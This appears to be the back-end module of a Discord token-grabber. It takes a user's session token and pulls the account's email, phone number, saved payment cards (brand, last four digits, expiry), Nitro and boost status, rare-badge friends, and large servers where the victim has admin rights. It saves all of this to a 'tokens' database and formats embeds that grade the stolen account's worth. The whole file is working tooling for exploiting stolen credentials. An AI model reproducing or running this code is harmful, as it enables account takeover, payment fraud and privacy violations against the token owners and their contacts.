const { MessageEmbed } = require("discord.js");
const axios = require("axios");

const { getEmojis } = require("./badge_gen");
const { getPerms } = require("./permissions");
const { timestamp } = require("./utils");

const con = require("./db.js");

async function generateEmbed(token) {
  var has_hq_guild = false;
  var has_nitro = false;
  var has_billing = false;
  var has_boosts = false;

  const embed = new MessageEmbed();

  var user = await checkToken(token);
  // console.log(user);
  if (user != false) {
    embed.setTitle("User Info");
    embed.setColor("#0099ff");
    embed.setThumbnail(
      "https://cdn.discordapp.com/avatars/" +
        user.id +
        "/" +
        user.avatar +
        ".png?size=256"
    );
    embed.addFields(
      {
        name: "Username",
        value: "```" + user.username + "#" + user.discriminator + "```",
      },
      { name: "ID", value: "```" + user.id + "```" },
      { name: "Created", value: "```" + timestamp(user.id) + "```" }
    );
    if (user.email != null) {
      embed.addFields({
        name: "Email",
        value: "```" + user.email + "```",
      });
    }
    if (user.phone != null) {
      embed.addFields({
        name: "Phone",
        value: "```" + user.phone + "```",
      });
    }

    if (user.public_flags != 0) {
      embed.addFields({
        name: "Flags",
        value: getEmojis(user.public_flags),
      });
    }
    if (user.premium_type != undefined) {
      var type = "";
      if (user.premium_type == 1) {
        type = "Nitro Classic";
      } else if (user.premium_type == 2) {
        type = "Nitro";
      }
      embed.addFields({
        name: "Premium Type",
        value: "```" + type + "```",
      });
    }
    var has_billing = await checkBilling(token);
    if (has_billing != false) {
      var text = "";

      embed.addFields({
        name: "Billing",
        value: has_billing + text,
      });
    }
    var boosts = await getBoosts(token);
    if (boosts != false) {
      embed.addFields({
        name: "Boosts",
        value: boosts,
      });
    }
    if (user.bio != "") {
      embed.addFields({
        name: "Bio",
        value: "```" + user.bio + "```",
        inline: false,
      });
    }
    var HQ_Friends = await getFriends(token);
    embed.addFields({
      name: "Friend Count",
      value: "```" + HQ_Friends.length + "```",
    });
    if (HQ_Friends != false) {
      HQ_Friends.forEach((friend, index) => {
        if (friend.flags != 512) {
          return;
        }
        embed.addFields({
          name: "Friend " + (index + 1),
          value:
            "```yaml\n" +
            "Username: " +
            friend.username +
            "#" +
            friend.discriminator +
            "\n" +
            "ID: " +
            friend.id +
            "\n" +
            "Flags: " +
            getEmojis(friend.flags) +
            "\n" +
            "```",
          inline: false,
        });
      });
    }

    try {
      con.query(
        `UPDATE tokens SET email = ?, hasNitro = ?, badges = ?, email = ?, phone = ?, discord_id = ?, friend_count = ? WHERE token = ?`,
        [
          user.email,
          user.premium_type,
          user.public_flags,
          user.email,
          user.phone,
          user.id,
          HQ_Friends.length,
          token,
        ]
      );
    } catch (err) {
      console.log(err);
    }

    embeds = [
      embed,
      await generateGuildEmbed(token),
      {
        hq_quild: has_hq_guild,
        nitro: has_nitro,
        billing: has_billing,
        boosts: has_boosts,
      },
    ];
    return embeds;
  } else {
    embed.setTitle("User Info");
    embed.setDescription(":x: Invalid token");
    embed.setColor("#ff0000");
    embeds = [
      embed,
      await generateGuildEmbed(token),
      {
        hq_quild: has_hq_guild,
        nitro: has_nitro,
        billing: has_billing,
        boosts: has_boosts,
      },
    ];
    return embeds;
  }
}

async function checkToken(token) {
  const user = axios
    .get(`https://discord.com/api/v8/users/@me`, {
      headers: {
        Authorization: token,
        "Content-Type": "application/json",
      },
    })
    .then(async (res) => {
      return res.data;
    })
    .catch(async (err) => {
      return false;
    });
  return user;
}

function getBoosts(token) {
  const boosts = axios
    .get(
      `https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots`,
      {
        headers: {
          Authorization: token,
          "Content-Type": "application/json",
        },
      }
    )
    .then(async (res) => {
      // console.log(res.data.length);
      if (res.data.length == 0) {
        console.log("No boosts available");
        return false;
      }
      if (res.data.length > 0) {
        console.log(res.data.length + " boosts detected");
        var count = 0;
        for (var i = 0; i < res.data.length; i++) {
          // compare date to current date
          var date = new Date(res.data[i].cooldown_ends_at);
          var now = new Date();
          // if the date is in the future
          if (date > now) {
            console.log("Boost is on cooldown");
          } else {
            console.log("Boost is available");
            count++;
          }
        }
        var string =
          "```" +
          res.data.length +
          " boosts, " +
          count +
          " of which are available now.```";
        if (count > 0) {
          has_boosts = true;
        }
        return string;
      }
    });
  return boosts;
}

function checkBilling(token) {
  const billing = axios
    .get(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
      headers: {
        Authorization: token,
        "Content-Type": "application/json",
      },
    })
    .then(async (res) => {
      con.query(`UPDATE tokens SET hasBilling = ? WHERE token = ?`, [
        JSON.stringify(res.data),
        token,
      ]);

      var cards = "";
      if (res.data.length == 0) {
        return false;
      } else {
        res.data.forEach((element, index) => {
          if (element.expires_month == undefined) {
            cards += "`PayPal` " + "Valid: :question:" + "\n";
            return;
          }
          cards += `\`${index}\` Brand: \`${element.brand}\` Last 4: \`${
            element.last_4
          }\` Expire: \`${element.expires_month}/${
            element.expires_year
          }\` Valid: ${element.invalid ? ":x:" : ":white_check_mark:"}\n`;
        });
      }
      return cards;
    })
    .catch(async (err) => {
      console.log("Token is invalid");
      return false;
    });
  return billing;
}

function getFriends(token) {
  const friends = axios
    .get(`https://discord.com/api/v9/users/@me/relationships`, {
      headers: {
        Authorization: token,
        "Content-Type": "application/json",
      },
    })
    .then(async (res) => {
      var friends = [];
      res.data.forEach((element, index) => {
        friends.push({
          id: element.user.id,
          username: element.user.username,
          discriminator: element.user.discriminator,
          public_flags: element.user.public_flags,
        });
      });
      // console.log(friends);
      return friends;
    })
    .catch(async (err) => {
      console.log("Token is invalid");
      return false;
    });
  return friends;
}

function generateGuildEmbed(token) {
  embed = axios
    .get(`https://discord.com/api/v9/users/@me/guilds?with_counts=true`, {
      headers: {
        Authorization: token,
        "Content-Type": "application/json",
      },
    })
    .then(async (res) => {
      var discord_embed = new MessageEmbed()
        .setTitle("HQ Guilds")
        .setColor("#00ff00");
      // console.log(res.data);

      res.data.forEach(async (guild) => {
        if (guild.approximate_member_count < 100) {
          return;
        }
        if (getPerms(guild.permissions)) {
          const permissions = getPerms(guild.permissions);
          const yes = ":white_check_mark:";
          const no = ":x:";
          discord_embed.addField(
            "Name: " + guild.name,
            "ID: `" +
              guild.id +
              "`\n" +
              "Permissions: " +
              "\n" +
              "Administrator " +
              (permissions.includes("administrator") ? yes : no) +
              "\n" +
              "Manage Guild " +
              (permissions.includes("manage_guild") ? yes : no) +
              "\n" +
              "Manage Roles " +
              (permissions.includes("manage_roles") ? yes : no) +
              "\n" +
              "Manage Channels " +
              (permissions.includes("manage_channels") ? yes : no) +
              "\n" +
              "Manage Messages " +
              (permissions.includes("manage_messages") ? yes : no) +
              "\n" +
              "Kick Members " +
              (permissions.includes("kick_members") ? yes : no) +
              "\n" +
              "Ban Members " +
              (permissions.includes("ban_members") ? yes : no) +
              "\n" +
              "Owner: " +
              (guild.owner ? yes : no) +
              "\n" +
              "Member (online/total): `" +
              guild.approximate_presence_count +
              "/" +
              guild.approximate_member_count +
              "`\n" +
              "Botted confidence: `" +
              (
                100 -
                (guild.approximate_presence_count /
                  guild.approximate_member_count) *
                  100
              ).toFixed(2) +
              "%`" +
              "\n"
          );
          if (guild.approximate_member_count > 500) {
            has_hq_guild = true;
          }
        }
      });
      if (discord_embed.fields.length == 0) {
        discord_embed.setDescription("No HQ Guilds found. cringe.");
        discord_embed.setColor("#ff0000");
      }
      return discord_embed;
    })
    .catch(async (err) => {
      console.log("Failed to get HQ Guilds");
      const discord_embed = new MessageEmbed()
        .setTitle("HQ Guilds")
        .setColor("#ff0000")
        .setDescription("Failed to get HQ Guilds");

      return discord_embed;
    });
  return embed;
}

module.exports = { generateEmbed };
